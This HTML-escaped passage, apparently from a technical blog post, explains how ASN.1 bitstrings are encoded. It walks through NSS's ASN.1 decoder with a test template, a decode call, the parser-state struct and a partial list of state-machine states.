that&amp;#39;s about it.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;ASN.1 &lt;/span&gt;&lt;span class=\"c7\"&gt;bitstrings&lt;/span&gt;&lt;span&gt;&amp;nbsp;are strings of bits as opposed to bytes. You could for example have a bitstring with a length of a single bit (so either a &lt;/span&gt;&lt;span class=\"c7\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=\"c7\"&gt;1&lt;/span&gt;&lt;span class=\"c9\"&gt;) or a bitstring with a length of 127 bits (so 15 full bytes plus an extra 7 bits.) &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;Encoded ASN.1 &lt;/span&gt;&lt;span class=\"c7\"&gt;bitstrings&lt;/span&gt;&lt;span&gt;&amp;nbsp;have an extra metadata byte after the length but before the contents, which encodes the number of unused &lt;/span&gt;&lt;span class=\"c17\"&gt;bits&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;in the final byte.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c9\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhozw2VvZycyqovtb9-AdzBUGQAUR8Bt9lGRG4A0LS9aMYAohwNVGi7CAFrCGUG6Y3SGu1iFvpn85ZrrPiA0f6dxo2Qy18ypN6sf_LG7mNNMICekk9VOcWHMDE7ZtRoZQyeIiWhKr8D0Od3frzIFnEc6oYPM0CG9kGk4QWUVSAxMrqoD6km_Cy5V1ww/s1165/image1%20%282%29%283%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhozw2VvZycyqovtb9-AdzBUGQAUR8Bt9lGRG4A0LS9aMYAohwNVGi7CAFrCGUG6Y3SGu1iFvpn85ZrrPiA0f6dxo2Qy18ypN6sf_LG7mNNMICekk9VOcWHMDE7ZtRoZQyeIiWhKr8D0Od3frzIFnEc6oYPM0CG9kGk4QWUVSAxMrqoD6km_Cy5V1ww/s1165/image1%20%282%29%283%29.png\" border=\"0\" alt=\"Diagram showing the complete encoding of a 3-bit bitstring. The length of 2 includes the unused-bits count byte which has a value of 5, indicating that only the 3 most-significant bits of the final byte are valid.\" style=\"max-height: 750; max-width: 600px;\"title=\"Diagram showing the complete encoding of a 3-bit bitstring. The length of 2 includes the unused-bits count byte which has a value of 5, indicating that only the 3 most-significant bits of the final byte are valid.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c34 c8\"&gt;&lt;span class=\"c27 c26\"&gt;Diagram showing the complete encoding of a 3-bit bitstring. The length of 2 includes the unused-bits count byte which has a value of 5, indicating that only the 3 most-significant bits of the final byte are valid.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8 c14 c34\"&gt;&lt;span class=\"c26 c27\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c32 c8\" id=\"h.9dutmbj0iutz\"&gt;&lt;span class=\"c31 c28\"&gt;Parsing ASN.1&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c9\"&gt;ASN.1 data always needs to be decoded in tandem with a template that tells the parser what data to expect and also provides output pointers to be filled in with the parsed output data. Here&amp;#39;s the template my test program uses to exercise the bitstring code:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.e816d0e76cff75906d870663f8d39eaa14fc6487\"&gt;&lt;/a&gt;&lt;a id=\"t.1\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c16\"&gt;const&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c20\"&gt;SecAsn1Template&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;simple_bitstring_template&lt;/span&gt;&lt;span class=\"c1\"&gt;[]&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; SEC_ASN1_BIT_STRING &lt;/span&gt;&lt;span class=\"c1\"&gt;|&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;SEC_ASN1_MAY_STREAM&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// kind: bit string,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// &amp;nbsp;may be constructed&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// offset: in dest/src&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c23\"&gt;// sub: subtemplate for indirection&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;sizeof&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c20\"&gt;SecAsn1Item&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// size: of output structure&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span&gt;A &lt;/span&gt;&lt;span class=\"c7\"&gt;SecASN1Item&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a very simple wrapper around a buffer. We can provide a &lt;/span&gt;&lt;span class=\"c7\"&gt;SecAsn1Item&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;for the parser to use to return the parsed bitstring then call the parser:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.800141608823d3e78f5e3937494968c764bff2e1\"&gt;&lt;/a&gt;&lt;a id=\"t.2\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c20\"&gt;SecAsn1Item&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;decoded &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c20\"&gt;PLArenaPool&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;pool &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;PORT_NewArena&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c11\"&gt;1024&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c20\"&gt;SECStatus&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;status &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; SEC_ASN1Decode&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;pool&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// pool: arena for destination allocations&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"c3\"&gt;decoded&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// dest: decoded encoded items in to here&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"c3\"&gt;simple_bitstring_template&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// template&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;asn1_bytes&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c23\"&gt;// buf: asn1 input bytes&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;asn1_bytes_len&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;// len: input size&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 class=\"c32 c8\" id=\"h.ge5rhouvh4pm\"&gt;&lt;span class=\"c28 c31\"&gt;NSS ASN.1 state machine&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c9\"&gt;The state machine has two core data structures:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c7\"&gt;SEC_ASN1DecoderContext&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;- the overall parsing context&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c7\"&gt;sec_asn1d_state&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;- a single parser state, kept in a doubly-linked list forming a stack of nested states&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8\"&gt;&lt;span class=\"c9\"&gt;Here&amp;#39;s a trimmed version of the state object showing the relevant fields:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.6e6d0d518a15f071678c6483b9dc57daeed428e3\"&gt;&lt;/a&gt;&lt;a id=\"t.3\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c16\"&gt;typedef&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;struct&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;sec_asn1d_state_struct &lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; SEC_ASN1DecoderContext &lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;top&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;const&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c20\"&gt;SecAsn1Template&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;theTemplate&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;void&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;dest&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;struct&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;sec_asn1d_state_struct &lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;parent&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;struct&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;sec_asn1d_state_struct &lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;child&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; sec_asn1d_parse_place place&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;long&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;contents_length&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;long&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;pending&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;long&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;consumed&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;int&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;depth&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;sec_asn1d_state&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;The main engine of the parsing state machine is the method &lt;/span&gt;&lt;span class=\"c7\"&gt;SEC_ASN1DecoderUpdate&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;which takes a context object, raw input buffer and length:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.ca1f754aaf2b9b2a69a0b772c008c3066c24eed5\"&gt;&lt;/a&gt;&lt;a id=\"t.4\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c20\"&gt;SECStatus&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;SEC_ASN1DecoderUpdate &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;SEC_ASN1DecoderContext &lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;cx&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;const&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;char&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;buf&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;size_t len&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;The current state is stored in the context object&amp;#39;s &lt;/span&gt;&lt;span class=\"c7\"&gt;current&lt;/span&gt;&lt;span&gt;&amp;nbsp;field, and that current &lt;/span&gt;&lt;span class=\"c7\"&gt;state&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=\"c7\"&gt;place&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;field determines the current state which the parser is in. Those states are defined here:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.58b2c4a0a10300b6306e34913640a092d86c5d56\"&gt;&lt;/a&gt;&lt;a id=\"t.5\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;&amp;#8203;&amp;#8203;&lt;/span&gt;&lt;span class=\"c16\"&gt;typedef&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;enum&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; beforeIdentifier&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; duringIdentifier&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; afterIdentifier&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; beforeLength&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; duringLength&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; afterLength&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; beforeBitString&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; duringBitString&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; duringConstructedString&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; duringGroup&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; duringLeaf&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; duringSaveEncoding&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; duringSequence&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; afterConstructedString&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; afterGroup&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; afterExplicit&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; afterImplicit&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; afterInline&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; afterPointer&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; afterSaveEncoding&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; beforeEndOfContents&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; duringEndOfContents&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; afterEndOfContents&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; beforeChoice&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; 